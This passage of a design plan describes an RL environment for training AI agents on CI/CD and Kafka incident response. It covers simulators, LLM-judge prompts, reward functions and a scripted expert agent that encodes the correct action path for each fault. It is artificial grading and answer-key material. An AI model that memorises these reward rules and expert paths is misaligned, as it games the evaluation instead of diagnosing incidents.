                }
            return result
        return {gid: {"total_lag": g.total_lag, "status": g.status}
                for gid, g in self.consumer_groups.items()}

    def inspect_partition(self, topic: str, partition_id: int) -> dict:
        t = self.topics.get(topic)
        if not t:
            return {"error": f"Topic '{topic}' not found"}
        p = t.partitions.get(partition_id)
        if p is None:
            return {"error": f"Partition {partition_id} not found"}
        result = p.__dict__.copy()
        if p.stuck_at_offset:
            result["diagnosis_hint"] = (
                f"Consumer committed offset has not advanced past {p.stuck_at_offset}. "
                f"Message at this offset may be unprocessable.")
        return result

    def check_isr_status(self, topic: str | None = None) -> dict:
        topics = {topic: self.topics[topic]} if topic and topic in self.topics else self.topics
        result = {}
        for tname, t in topics.items():
            underrep = [pid for pid, p in t.partitions.items()
                        if len(p.isr_replicas) < t.replication_factor]
            result[tname] = {
                "replication_factor": t.replication_factor,
                "underreplicated_partitions": underrep,
                "isr_by_partition": {pid: p.isr_replicas
                                     for pid, p in t.partitions.items()},
            }
        return result

    def describe_consumer_group(self, group_id: str) -> dict:
        g = self.consumer_groups.get(group_id)
        if not g:
            return {"error": f"Group '{group_id}' not found"}
        return g.__dict__

    def read_broker_logs(self, broker_id: int | None = None, lines: int = 20) -> str:
        brokers = [self.brokers[broker_id]] if broker_id is not None else list(self.brokers.values())
        out = []
        for b in brokers:
            out.append(f"=== Broker {b.id if hasattr(b,'id') else b.broker_id} "
                       f"[{b.status}] heap={b.heap_used_mb}/{b.heap_max_mb}MB ===")
            out.extend(b.log_lines[-lines:])
        return "\n".join(out)

    def read_consumer_logs(self, group_id: str, lines: int = 30) -> str:
        g = self.consumer_groups.get(group_id)
        if not g:
            return f"Group '{group_id}' not found."
        fault = self._task.get("fault_type","")
        log_generators = {
            "poison_pill": [
                f"[{group_id}] ConsumerRecord fetched: topic=orders partition=2 offset=8847293",
                f"[{group_id}] ERROR DeserializationException: Avro magic byte mismatch at offset 8847293",
                f"[{group_id}] Retrying offset 8847293 (attempt 47/inf)...",
                f"[{group_id}] Heartbeat sent. No commit progress.",
            ],
            "zombie_consumer": [
                f"[{group_id}] poll() returned 0 records",
                f"[{group_id}] poll() returned 0 records",
                f"[{group_id}] Heartbeat thread alive. Last committed offset: 8234001 (7200s ago)",
                f"[{group_id}] poll() returned 0 records",
            ],
            "rebalance_storm": [
                f"[{group_id}] Rebalance triggered: member left group",
                f"[{group_id}] Assigned partitions: [0, 2]",
                f"[{group_id}] Rebalance triggered: session timeout (6000ms)",
                f"[{group_id}] Rebalance triggered: member left group",
            ],
        }
        lines_out = log_generators.get(fault, [f"[{group_id}] Processing normally."])
        return "\n".join(lines_out[:lines])

    def check_schema_registry(self, subject: str | None = None) -> dict:
        if subject:
            version = self.schema_registry.schema_versions.get(subject)
            deleted = subject in " ".join(self.schema_registry.deleted_schemas)
            return {
                "subject": subject,
                "latest_version": version,
                "status": self.schema_registry.status,
                "deleted_versions": [d for d in self.schema_registry.deleted_schemas
                                     if d.startswith(subject)],
                "recent_failures": [f for f in self.schema_registry.recent_failures
                                    if subject in f],
            }
        return self.schema_registry.__dict__

    def skip_offset(self, group_id: str, topic: str, partition: int,
                    to_offset: int) -> dict:
        g = self.consumer_groups.get(group_id)
        if not g:
            return {"success": False, "message": "Group not found"}
        if g.status != "empty":
            return {"success": False,
                    "message": f"Group must be EMPTY to skip offset. Current status: {g.status}. "
                               "Stop all consumers first, then retry."}
        t = self.topics.get(topic)
        if t and partition in t.partitions:
            p = t.partitions[partition]
            prev = p.consumer_offsets.get(group_id, 0)
            p.consumer_offsets[group_id] = to_offset
            p.stuck_at_offset = None
            new_lag = p.leo - to_offset
            p.lag[group_id] = new_lag
            return {"success": True, "previous_offset": prev,
                    "new_offset": to_offset, "lag_after": new_lag}
        return {"success": False, "message": "Topic/partition not found"}

    def restart_consumer_group(self, group_id: str) -> dict:
        g = self.consumer_groups.get(group_id)
        if not g:
            return {"success": False}
        before = len(g.members)
        for m in g.members:
            m.is_processing = True
            m.last_heartbeat_seconds_ago = 1
        g.status = "stable"
        g.last_commit_seconds_ago = 1
        return {"members_before": before, "members_after": before,
                "rebalance_triggered": True, "new_status": "stable"}

    def increase_broker_heap(self, broker_id: int, new_heap_mb: int) -> dict:
        b = self.brokers.get(broker_id)
        if not b:
            return {"success": False}
        b.heap_max_mb = new_heap_mb
        return {"success": True, "restart_required": True,
                "estimated_downtime_seconds": 45, "new_heap_mb": new_heap_mb}

    def check_dead_letter_queue(self, topic: str) -> dict:
        dlq_topic = f"{topic}.dlq"
        has_dlq = dlq_topic in self.topics
        return {
            "dlq_topic": dlq_topic,
            "configured": has_dlq,
            "message_count": random.randint(0, 100) if has_dlq else 0,
            "recommendation": "Configure DLQ to avoid infinite retry loops" if not has_dlq else "DLQ active.",
        }
```

---

## Phase 3 — LLM Judge (Live, Multi-Persona)

### File: `judge/llm_judge.py`

Mirrors `kube-sre-gym/judge.py` pattern: personas, phase detection, adversarial subclass.

```python
"""
judge/llm_judge.py

LLM-as-judge for CI/CD and Kafka SRE training.
Architecture mirrors kube-sre-gym/judge.py:
  - Multi-persona scoring (junior / senior / principal)
  - Phase-aware AdversarialJudge subclass
  - Domain-specific system prompts embedded as constants
  - Red herring awareness
  - No hardcoded score lookup tables
"""

from __future__ import annotations
import json, logging, time
from .llm_client import LLMClient

logger = logging.getLogger(__name__)

# ── Personas (same contract as kube-sre-gym) ─────────────────────────────────

PERSONAS = {
    "junior": """You are a senior SRE mentoring a junior engineer during an incident.
Be encouraging. Give partial credit for reasonable approaches.
Provide a hint in feedback about what to look at next.
Accept approximate diagnoses if the direction is correct.""",

    "senior": """You are a staff SRE evaluating an engineer's incident response.
Apply standard on-call expectations. Reward systematic investigation.
Penalize: repeated commands, jumping to fixes before diagnosis, ignoring key signals.""",

    "principal": """You are a principal SRE evaluating with high standards.
Reward efficiency — fast correct diagnosis is GOOD. Penalize WRONG actions, not fast ones.
For multi-fault scenarios, penalize partial fixes.
Distinguish between healthy scepticism of red herrings vs ignoring real signals.""",
}

# ── Domain system prompts ─────────────────────────────────────────────────────

CICD_JUDGE_SYSTEM = """You are a Principal SRE specialising in CI/CD security and pipeline reliability.
You have investigated supply chain attacks, secret rotation failures, and runner compromises
at organisations running 50,000+ pipeline jobs per day.

WHAT GOOD CI/CD INCIDENT RESPONSE LOOKS LIKE:
1. Read audit logs early — they reveal the timeline and the actor
2. Read job logs for the failing step — pipeline STATUS alone is not enough
3. Check action integrity before dismissing a third-party action as "just flaky"
4. Never rotate or rollback before confirming root cause
5. In supply chain incidents: isolate runner first, investigate second

COMMON MISTAKES:
- Checking pipeline status repeatedly without reading logs → significant penalty
- Jumping to rotate_secret or rollback before collecting evidence → severe penalty
- Ignoring audit log when the incident timeline is ambiguous → moderate penalty
- Checking the wrong pipeline when the fault is in a shared action → moderate penalty
- Assuming a healthy heartbeat means the runner is not compromised → severe penalty

Return JSON only:
{"score": <-1.0 to 1.0>, "feedback": "<1-2 sentences>", "missed_signal": "<what to check next or null>"}"""

KAFKA_JUDGE_SYSTEM = """You are a Principal SRE who has operated Kafka at scale (100+ brokers, 1000+ consumer groups).
You have diagnosed poison pills, zombie consumers, ISR churn, and broker OOM cascades in production.

WHAT GOOD KAFKA INCIDENT RESPONSE LOOKS LIKE:
1. Start broad: get_cluster_metrics to establish if this is broker-side or consumer-side
2. Always look at PER-PARTITION consumer lag — never only aggregate
3. For any consumer lag incident: inspect_partition before any remediation
4. Distinguish broker logs from consumer logs — they reveal different failure layers
5. Never skip_offset without inspecting what is AT that offset
6. Zombie consumer: heartbeat ≠ processing. Verify is_processing via describe_consumer_group.

COMMON MISTAKES:
- Checking only aggregate consumer lag and missing a stuck partition → severe penalty
  (This is the single most common Kafka diagnostic mistake)
- Restarting consumer before checking whether it is a poison pill → moderate penalty
- Investigating downstream services when Kafka is the true cause → moderate penalty
- Assuming broker is healthy because a health endpoint returns 200 → significant penalty
- skip_offset without first confirming stuck_at_offset from inspect_partition → severe penalty

Return JSON only:
{"score": <-1.0 to 1.0>, "feedback": "<1-2 sentences>", "missed_signal": "<what to check next or null>"}"""


# ── Phase detection (heuristic, no LLM call) ──────────────────────────────────

_CICD_OBSERVE   = ("check_pipeline_status","check_runner_status","check_action_integrity")
_CICD_GATHER    = ("read_job_logs","inspect_secret","read_audit_log")
_CICD_FIX       = ("rollback_workflow","rotate_secret","pin_action_to_sha","isolate_runner")

_KAFKA_OBSERVE  = ("get_cluster_metrics","check_consumer_lag","check_isr_status")
_KAFKA_LOCATE   = ("inspect_partition","describe_consumer_group","read_broker_logs")
_KAFKA_DIAGNOSE = ("read_consumer_logs","check_schema_registry","check_dead_letter_queue")
_KAFKA_FIX      = ("skip_offset","restart_consumer_group","increase_broker_heap")

_SHARED_DECLARE = ("declare_rca",)

_PHASE_ORDER = {
    "observe": 0, "gather": 1, "locate": 1,
    "diagnose": 2, "fix": 3, "declare": 4,
}

def _detect_phase(action: str, domain: str) -> str:
    if action in _SHARED_DECLARE:
        return "declare"
    if domain == "cicd":
        if action in _CICD_OBSERVE: return "observe"
        if action in _CICD_GATHER:  return "gather"
        if action in _CICD_FIX:     return "fix"
    else:
        if action in _KAFKA_OBSERVE:  return "observe"
        if action in _KAFKA_LOCATE:   return "locate"
        if action in _KAFKA_DIAGNOSE: return "diagnose"
        if action in _KAFKA_FIX:      return "fix"
    return "observe"


# ── LLMJudge ─────────────────────────────────────────────────────────────────

class LLMJudge:
    def __init__(self, llm: LLMClient):
        self.llm = llm

    def evaluate(
        self,
        action: str,
        observation: str,
        task_context: dict,
        history: list,
        persona: str = "senior",
    ) -> tuple[float, str]:
        domain = task_context.get("domain","cicd")
        system = (CICD_JUDGE_SYSTEM if domain == "cicd" else KAFKA_JUDGE_SYSTEM)

        history_summary = "\n".join(
            f"  Step {h['step']}: {h['action']} → reward {h.get('reward',0):.2f}"
            for h in history[-5:]
        ) or "  (first step)"

        user_prompt = f"""Evaluate this SRE action during a {domain.upper()} incident.

INCIDENT:
- Alert: {task_context.get('alert_message','')}
- Root cause: {task_context.get('root_cause','')}
- Correct fix: {task_context.get('resolution_steps',[''])[0]}
- Difficulty: {task_context.get('difficulty','medium')}

AGENT ACTION:
- Action: {action}
- Observation (truncated): {observation[:500]}

RECENT HISTORY:
{history_summary}
- Total steps taken: {len(history) + 1}

Return JSON only: {{"score": <float -1.0 to 1.0>, "feedback": "<1-2 sentences>", "missed_signal": "<str or null>"}}"""

        try:
            result = self.llm.chat_json(
                PERSONAS[persona] + "\n\n" + system,
                user_prompt, temperature=0.2, max_tokens=256)
            score = max(-1.0, min(1.0, float(result.get("score", 0.0))))
            return score, result.get("feedback","")
        except Exception as e:
            logger.error(f"LLMJudge error: {e}", exc_info=True)
            return 0.0, f"Judge error: {type(e).__name__}"

    def score_rca(
        self,
        declared_component: str,
        task_context: dict,
        history: list,
    ) -> tuple[float, str]:
        correct = task_context.get("fault_component","")
        evidence_actions = {h["action"] for h in history}
        ideal = set(task_context.get("ideal_investigation_path",[]))
        coverage = len(evidence_actions & ideal) / max(len(ideal), 1)

        if declared_component.lower() == correct.lower():
            base = 0.50 + coverage * 0.30
            steps_used = len(history)
            max_steps = task_context.get("max_steps", 15)
            efficiency = max(0, (max_steps - steps_used) / max_steps)
            score = min(0.99, base + efficiency * 0.20)
            feedback = f"Correct. Evidence coverage {coverage:.0%}."
        else:
            score = -0.40
            feedback = f"Wrong component '{declared_component}'. Correct: '{correct}'."
        return score, feedback


# ── AdversarialJudge (phase-aware, red-herring-aware) ────────────────────────

class AdversarialJudge(LLMJudge):
    """
    Extends LLMJudge with:
    - Phase-ordering enforcement (observe → gather → fix)
    - Red herring awareness bonus
    """

    def evaluate(
        self,
        action: str,
        observation: str,
        task_context: dict,
        history: list,
        persona: str = "senior",
    ) -> tuple[float, str]:
        base_score, feedback = super().evaluate(
            action, observation, task_context, history, persona)

        domain = task_context.get("domain","cicd")
        current_phase = _detect_phase(action, domain)

        if self._is_phase_order_correct(current_phase, domain, history):
            base_score += 0.15
        else:
            skipped = self._get_skipped_phases(current_phase, domain, history)
            if skipped:
                base_score -= 0.25
                feedback += f" Skipped {', '.join(skipped)} before {current_phase}."

        red_herrings = task_context.get("red_herrings",[])
        if red_herrings and self._touches_red_herring(observation, red_herrings):
            if current_phase not in ("fix","declare"):
                base_score += 0.10
                feedback += " Good: investigating a potential red herring before committing to a fix."

        return max(-1.0, min(1.0, base_score)), feedback

    def _is_phase_order_correct(self, current_phase: str, domain: str,
                                 history: list) -> bool:
        if not history:
            return current_phase == "observe"
        current_order = _PHASE_ORDER.get(current_phase, 0)
        past_phases = [_detect_phase(h["action"], domain) for h in history]
        max_past = max((_PHASE_ORDER.get(p,0) for p in past_phases), default=0)
        return current_order <= max_past + 1

    def _get_skipped_phases(self, current_phase: str, domain: str,
                             history: list) -> list[str]:
        current_order = _PHASE_ORDER.get(current_phase, 0)
        if current_order <= 1:
            return []
        past_phases = {_detect_phase(h["action"], domain) for h in history}
        return [p for p, o in _PHASE_ORDER.items()
                if o < current_order and p not in past_phases]

    _RED_HERRING_TERMS = {
        "unrelated","clean","no errors","green","healthy","passing",
        "status operational","no recent changes","exit code 0",
    }

    def _touches_red_herring(self, observation: str, red_herrings: list[str]) -> bool:
        obs_lower = observation.lower()
        for herring in red_herrings:
            herring_lower = herring.lower()
            for term in self._RED_HERRING_TERMS:
                if term in herring_lower and term in obs_lower:
                    return True
            keywords = [w for w in herring_lower.split() if len(w) >= 6]
            if sum(1 for kw in keywords if kw in obs_lower) >= 2:
                return True
        return False
```

---

## Phase 4 — Reward Function

### File: `reward.py`

```python
"""
reward.py

Domain-aware reward function for CI/CD and Kafka SRE training.
Uses EvidenceTracker dataclass — no magic float lookup tables.
"""

from __future__ import annotations
from dataclasses import dataclass, field

@dataclass
class EvidenceTracker:
    logs_read: bool = False
    secrets_inspected: bool = False
    audit_log_read: bool = False
    action_integrity_checked: bool = False
    runner_status_checked: bool = False
    # Kafka
    per_partition_lag_checked: bool = False
    partition_inspected: bool = False
    broker_logs_read: bool = False
    consumer_group_described: bool = False
    schema_checked: bool = False

    def evidence_count_cicd(self) -> int:
        return sum([self.logs_read, self.secrets_inspected,
                    self.audit_log_read, self.action_integrity_checked])

    def evidence_count_kafka(self) -> int:
        return sum([self.per_partition_lag_checked, self.partition_inspected,
                    self.broker_logs_read, self.consumer_group_described,
                    self.schema_checked])


_CICD_FIX_ACTIONS = {"rollback_workflow","rotate_secret","pin_action_to_sha","isolate_runner"}
_KAFKA_FIX_ACTIONS = {"skip_offset","restart_consumer_group","increase_broker_heap"}


def compute_step_reward(
    action: str,
    task: dict,
    step_count: int,
    actions_taken: list[str],
    evidence: EvidenceTracker,
    observation: dict | str = "",
) -> float:
    domain = task.get("domain","cicd")
    fault  = task.get("fault_type","")
    max_s  = task.get("max_steps", 15)
    is_redundant = actions_taken.count(action) > 1

    if is_redundant:
        penalty = -0.08 if step_count < max_s * 0.5 else -0.20
        return penalty

    if domain == "cicd":
        return _cicd_reward(action, fault, step_count, max_s, evidence)
    return _kafka_reward(action, fault, step_count, max_s, evidence)


def _cicd_reward(action, fault, step_count, max_s, ev: EvidenceTracker) -> float:
    reward = 0.0

    # Evidence gathering
    if action == "read_job_logs":
        ev.logs_read = True
        reward = 0.12
    elif action == "inspect_secret" and fault in ("secret_rotation_break","oidc_token_failure"):
        ev.secrets_inspected = True
        reward = 0.15
    elif action == "check_action_integrity":
        ev.action_integrity_checked = True
        reward = 0.18
    elif action == "read_audit_log" and not ev.audit_log_read:
        ev.audit_log_read = True
        reward = 0.10
    elif action == "check_runner_status":
        ev.runner_status_checked = True
        reward = 0.12 if fault in ("runner_queue_flood","runner_compromise") else 0.04
    elif action == "check_pipeline_status":
        reward = 0.04  # low value — status alone is not enough

    # Fix actions
    elif action in _CICD_FIX_ACTIONS:
        ev_count = ev.evidence_count_cicd()
        multipliers = {0: 0.1, 1: 0.5}
        mult = multipliers.get(ev_count, 1.0)
        base = 0.30
        reward = base * mult
        if ev_count == 0:
            reward -= 0.20  # blind fix penalty

    return max(-1.0, min(1.0, reward))


def _kafka_reward(action, fault, step_count, max_s, ev: EvidenceTracker) -> float:
    reward = 0.0

    if action == "get_cluster_metrics":
        reward = 0.05  # start here, but not sufficient

    elif action == "check_consumer_lag":
        # Only give full reward if per-partition view was used
        # The environment must pass this signal via observation inspection
        ev.per_partition_lag_checked = True  # env sets this based on args
        reward = 0.15

    elif action == "inspect_partition":
        if not ev.per_partition_lag_checked:
            reward = 0.10  # penalise going here without lag context
        else:
            ev.partition_inspected = True
            reward = 0.20  # core Kafka diagnostic signal

    elif action == "read_broker_logs":
        ev.broker_logs_read = True
        reward = 0.15 if fault in ("broker_oom_cascade","isr_churn","retry_amplification") else 0.06

    elif action == "describe_consumer_group":
        ev.consumer_group_described = True
        reward = 0.15 if fault in ("zombie_consumer","rebalance_storm") else 0.06

    elif action == "read_consumer_logs":
        reward = 0.10

    elif action == "check_schema_registry":
        ev.schema_checked = True
        reward = 0.18 if fault == "schema_desync" else 0.04

    # Fix actions — phase enforcement
    elif action == "skip_offset":
        if not ev.partition_inspected:
            reward = -0.30  # severe: never skip without inspecting
        elif not ev.per_partition_lag_checked:
            reward = -0.15
        else:
            reward = 0.25
    elif action in _KAFKA_FIX_ACTIONS:
        ev_count = ev.evidence_count_kafka()
        if ev_count < 2:
            reward = -0.10
        else:
            reward = 0.20

    return max(-1.0, min(1.0, reward))


def compute_rca_reward(declared_component: str, task: dict,
                       step_count: int, evidence: EvidenceTracker) -> float:
    correct = task.get("fault_component","")
    max_s   = task.get("max_steps", 15)

    if declared_component.lower() != correct.lower():
        return -0.40

    ev_count = (evidence.evidence_count_cicd()
                if task.get("domain") == "cicd"
                else evidence.evidence_count_kafka())
    base = 0.50
    evidence_bonus = min(ev_count * 0.05, 0.20)
    efficiency     = max(0, (max_s - step_count) / max_s) * 0.30
    return min(0.999, base + evidence_bonus + efficiency)
```

---

## Phase 5 — Expert Agent

### File: `training/expert_agent.py`

```python
"""
training/expert_agent.py

Rule-based expert agent that follows the optimal investigation path per domain.
Used to generate high-quality SFT training data before RL.
Target: >0.80 episode score on all 20 tasks.
"""

from __future__ import annotations
from dataclasses import dataclass


@dataclass
class EpisodeTrajectory:
    task_id: str
    domain: str
    steps: list[dict]
    total_reward: float
    final_score: float
    rca_correct: bool


class ExpertAgent:
    """
    Knows the fault_type and follows the domain-specific optimal path.
    Never repeats an action. Never fixes before collecting ≥3 evidence signals.
    """

    def __init__(self, task: dict):
        self.task = task
        self.domain = task["domain"]
        self.fault_type = task["fault_type"]
        self._step = 0
        self._actions_taken: list[str] = []
        self._plan: list[dict] = self._build_plan()

    def _build_plan(self) -> list[dict]:
        """
        Construct the optimal action sequence for this task.
        Each step is {"action": str, "kwargs": dict}.
        """
        fault = self.fault_type
        domain = self.domain

        if domain == "cicd":
            return self._cicd_plan(fault)
        return self._kafka_plan(fault)

    def _cicd_plan(self, fault: str) -> list[dict]:
        affected = self.task.get("affected_pipelines", ["deploy-prod"])
        base = [
            {"action": "check_pipeline_status", "kwargs": {"pipeline_name": affected[0]}},
            {"action": "read_job_logs",          "kwargs": {"pipeline_name": affected[0]}},
            {"action": "read_audit_log",          "kwargs": {"hours_back": 24}},
        ]
        fixes = {
            "secret_rotation_break": [
                {"action": "inspect_secret",   "kwargs": {"secret_name": "AWS_DEPLOY_KEY"}},
                {"action": "rotate_secret",    "kwargs": {"secret_name": "AWS_DEPLOY_KEY"}},
            ],
            "supply_chain": [
                {"action": "check_action_integrity", "kwargs": {"action_name": "file-changed-checker", "version": "v3"}},
                {"action": "pin_action_to_sha",      "kwargs": {"action_name": "file-changed-checker", "sha": "3fa1c2d7"}},
            ],
            "runner_queue_flood": [
                {"action": "check_runner_status", "kwargs": {}},
            ],
            "runner_compromise": [
                {"action": "check_runner_status", "kwargs": {"runner_id": "build-prod-03"}},
                {"action": "isolate_runner",       "kwargs": {"runner_id": "build-prod-03"}},
            ],
            "workflow_injection": [
                {"action": "check_action_integrity", "kwargs": {"action_name": "actions/checkout", "version": "v4"}},
                {"action": "isolate_runner",          "kwargs": {"runner_id": "gha-runner-01"}},
            ],
            "oidc_token_failure": [
                {"action": "inspect_secret", "kwargs": {"secret_name": "AWS_DEPLOY_KEY"}},
            ],
            "canary_gate_stuck": [
                {"action": "check_pipeline_status", "kwargs": {"pipeline_name": affected[0]}},
            ],
            "flaky_test_regression": [
                # Expert deliberately does NOT retry — reads logs instead
                {"action": "read_job_logs", "kwargs": {"pipeline_name": "test-suite"}},
            ],
            "dependency_version_lock": [
                {"action": "check_action_integrity", "kwargs": {"action_name": "deploy-service", "version": "latest"}},
                {"action": "pin_action_to_sha",      "kwargs": {"action_name": "deploy-service", "sha": "v3-stable-sha"}},
            ],
            "artifact_cache_poison": [
                {"action": "read_audit_log", "kwargs": {"hours_back": 12}},
            ],
        }
        plan = base + fixes.get(fault, [])
        plan.append({"action": "declare_rca",
                     "kwargs": {"fault_component": self.task.get("fault_component","")}})
        return plan

    def _kafka_plan(self, fault: str) -> list[dict]:
        affected_topic = (self.task.get("affected_topics") or ["orders"])[0]
        affected_group = (self.task.get("affected_consumer_groups") or ["order-fulfillment"])[0]
        base = [
            {"action": "get_cluster_metrics", "kwargs": {}},
            {"action": "check_consumer_lag",  "kwargs": {"group_id": affected_group,
                                                          "topic": affected_topic}},
        ]
        fixes = {
            "poison_pill": [
                {"action": "inspect_partition",        "kwargs": {"topic": affected_topic, "partition_id": 2}},
                {"action": "read_consumer_logs",       "kwargs": {"group_id": affected_group}},
                {"action": "describe_consumer_group",  "kwargs": {"group_id": affected_group}},
                {"action": "skip_offset",              "kwargs": {"group_id": affected_group,
                                                                   "topic": affected_topic,
                                                                   "partition": 2,
                                                                   "to_offset": 8_847_294}},
            ],
            "zombie_consumer": [
                {"action": "describe_consumer_group", "kwargs": {"group_id": affected_group}},
                {"action": "read_consumer_logs",      "kwargs": {"group_id": affected_group}},
                {"action": "restart_consumer_group",  "kwargs": {"group_id": affected_group}},
            ],
            "broker_oom_cascade": [
                {"action": "read_broker_logs",       "kwargs": {"broker_id": 0}},
                {"action": "check_isr_status",       "kwargs": {}},
                {"action": "increase_broker_heap",   "kwargs": {"broker_id": 0, "new_heap_mb": 16384}},
            ],
            "isr_churn": [
                {"action": "check_isr_status",   "kwargs": {}},
                {"action": "read_broker_logs",   "kwargs": {"broker_id": 2}},
                {"action": "inspect_partition",  "kwargs": {"topic": affected_topic, "partition_id": 0}},
            ],
            "rebalance_storm": [
                {"action": "describe_consumer_group", "kwargs": {"group_id": affected_group}},
                {"action": "read_consumer_logs",      "kwargs": {"group_id": affected_group}},
                {"action": "restart_consumer_group",  "kwargs": {"group_id": affected_group}},
            ],
            "schema_desync": [
                {"action": "check_schema_registry", "kwargs": {"subject": f"{affected_topic}-value"}},
                {"action": "read_consumer_logs",    "kwargs": {"group_id": affected_group}},
            ],
            "retry_amplification": [
                {"action": "read_broker_logs",        "kwargs": {}},
                {"action": "describe_consumer_group", "kwargs": {"group_id": affected_group}},
            ],
            "silent_lag": [
                {"action": "inspect_partition",        "kwargs": {"topic": affected_topic, "partition_id": 4}},
                {"action": "describe_consumer_group",  "kwargs": {"group_id": affected_group}},
                {"action": "skip_offset",              "kwargs": {"group_id": affected_group,
                                                                   "topic": affected_topic,
                                                                   "partition": 4,
                                                                   "to_offset": 2_847_292}},
            ],
            "topic_sprawl": [
                {"action": "read_broker_logs", "kwargs": {}},
            ],
            "producer_epoch": [
                {"action": "read_broker_logs",   "kwargs": {"broker_id": 0}},
                {"action": "inspect_partition",  "kwargs": {"topic": "payments", "partition_id": 0}},
            ],
        }
        plan = base + fixes.get(fault, [])
        plan.append({"action": "declare_rca",
                     "kwargs": {"fault_component": self.task.get("fault_component","")}})
        return plan

    def get_next_action(self, observation: dict | str, history: list) -> dict | None:
        while self._step < len(self._plan):
            step = self._plan[self._step]
            self._step += 1
            if step["action"] not in self._actions_taken:
                self._actions_taken.append(step["action"])
                return step
        return None  # episode complete

    def run_episode(self, env) -> EpisodeTrajectory:
        obs = env.reset(self.task)
        history = []
        total_reward = 0.0

        while True:
            action_spec = self.get_next_action(obs, history)
            if action_spec is None:
                break
            obs, reward, done, info = env.step(action_spec["action"],
                                               **action_spec.get("kwargs",{}))
            record = {"step": len(history)+1, "action": action_spec["action"],
                      "reward": reward, "observation": str(obs)[:200]}
            history.append(record)
            total_reward += reward
            if done:
                break

        final_score = env.grade()
        rca_step = next((h for h in history if h["action"] == "declare_rca"), None)
        rca_correct = info.get("rca_correct", False) if rca_step else False

        return EpisodeTrajectory(self.task["id"], self.domain,
                                  history, total_reward, final_score, rca_correct)
```

---

## Integration with Existing `server/app.py`

No new server needed. Add to the existing route dispatch:

```python
# server/app.py additions

from simulators.cicd_simulator import CICDSimulator
from simulators.kafka_simulator import KafkaSimulator
from judge.llm_judge import AdversarialJudge
from reward import compute_step_reward, compute_rca_reward, EvidenceTracker

# In env.reset():
if task["domain"] == "cicd":
    self._sim = CICDSimulator()
else:
    self._sim = KafkaSimulator()
self._sim.generate_incident_state(task)
self._evidence = EvidenceTracker()

# In env.step(action, **kwargs):
obs = getattr(self._sim, action)(**kwargs)
reward = compute_step_reward(action, self.task, self._step,
                              self._actions_taken, self._evidence, obs)
judge_score, feedback = self._judge.evaluate(action, str(obs),
                                              self.task, self.history)
```

---

## Execution Order (4 Weeks)

**Week 1 — Simulators**
- Implement `cicd_simulator.py` (fault injection + 10 investigation actions)
- Implement `kafka_simulator.py` (fault injection + 12 investigation actions)
- Test smoke:
  ```bash
  python -c "
  from simulators.cicd_simulator import CICDSimulator
  s = CICDSimulator()
  s.generate_incident_state({'fault_type':'secret_rotation_break'})
  print(s.inspect_secret('AWS_DEPLOY_KEY'))
  print(s.read_job_logs('deploy-prod'))
  "
  ```

**Week 2 — Task JSON + Judge**
- Write `tasks/cicd_tasks.json` (10 tasks, schema above)
- Write `tasks/kafka_tasks.json` (10 tasks)
- Implement `judge/llm_client.py` (Anthropic + OpenAI, 3 retries)
- Implement `judge/llm_judge.py` (LLMJudge + AdversarialJudge)

**Week 3 — Reward + Integration**
- Implement `reward.py` (EvidenceTracker, domain dispatch)
- Wire into `environment.py` and `server/app.py`
- Run 1 CI/CD + 1 Kafka episode end-to-end, verify reward signs

**Week 4 — Expert Agent + Data Generation**
- Implement `training/expert_agent.py`
- Run expert on all 20 tasks, target >0.80 per episode
- Export SFT dataset via existing `trajectory_logger.py`

---

## Definition of Done

- [ ] Expert agent achieves >0.80 average score across all 20 tasks
- [ ] CI/CD: fix-before-evidence consistently scores < 0.20
- [ ] Kafka: aggregate-lag-only investigation consistently scores < 0.30
- [ ] Per-partition inspection required to score > 0.70 on zombie/poison-pill
- [ ] SFT dataset ≥ 500 high-quality trajectory records
- [ ] AdversarialJudge correctly penalises top 3 mistakes per domain
- [ ] `generate_incident_state()` + action methods have no hardcoded strings
